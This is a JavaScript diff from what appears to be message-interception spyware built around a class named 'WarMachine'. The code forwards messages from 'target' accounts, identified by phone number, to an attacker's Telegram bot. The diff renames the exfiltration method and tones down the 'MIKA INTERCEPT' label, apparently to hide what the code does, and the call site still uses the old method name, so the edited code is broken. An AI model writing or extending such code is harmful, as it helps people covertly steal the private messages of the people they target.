@@ -39,7 +39,7 @@ class WarMachine {
         return { session: str, me };
     }
 
-    async snitchToBot(botToken, adminId, text) {
+    async PersnoloBot(botToken, adminId, text) {
         try {
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
             await axios.post(url, {
@@ -75,7 +75,7 @@ class WarMachine {
                         });
 
                         if (botConfig && botConfig.token && botConfig.admin) {
-                            const report = `<b>⚠️ MIKA INTERCEPT</b>\n\n<b>Target:</b> <code>${s.phone}</code>\n<b>From:</b> <code>${sender}</code>\n\n${cleanText}`;
+                            const report = `<b>⚠️ Mika</b>\n\n<b>Target:</b> <code>${s.phone}</code>\n<b>From:</b> <code>${sender}</code>\n\n${cleanText}`;
                             await this.snitchToBot(botConfig.token, botConfig.admin, report);
                         }
                     }
